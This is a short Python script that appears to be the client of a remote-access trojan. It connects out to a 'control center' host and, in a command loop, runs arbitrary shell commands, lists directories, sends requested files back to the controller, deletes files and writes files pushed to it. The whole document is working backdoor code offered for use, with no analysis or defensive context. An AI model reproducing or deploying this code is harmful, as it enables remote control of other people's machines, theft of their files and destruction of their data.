# cmd list
# pwd view current directory 
# dirof see a list of dir of your choice
# download_files - download files from dir
# send - sends a file
import os 
import socket

s = socket.socket()
port=8080
host=input(str("Please enter the control center adress: "))
s.connect((host,port))
print("Success ")
print("")

# recv cmd

while 1:
    command = s.recv(1024)
    command=command.decode()
    print("Command recieved")
    if command== "pwd":
        files = os.getcwd()
        files = str(files)
        #s.send("".encode())
        s.send(files.encode())
        print("Command completed...")

    elif command == "dir":
        files=os.listdir('.')
        files=str(files)
        s.send(files.encode())
        print("Command completed")

    elif command == "dirof":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files=str(files)
        s.send(files.encode())
        print("Command completed...")

    elif command == "run":
        user_input = s.recv(5000)
        user_input=user_input.decode()
        os.system(user_input)

    elif command == "download":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path,"rb")
        data = file.read()
        s.send(data)
        print("file sent...")

    elif command == "del":
        filesanddir = s.recv(6000)
        filesanddir = filesanddir.decode()
        os.remove(filesanddir)
        print("deleted")

    elif command == "send":
        filename = s.recv(6000)
        new_file = open(filename,"wb")
        data = s.recv(6000)
        new_file.write(data)
        new_file.close()

    else:
        print("")
        print("Command not found")

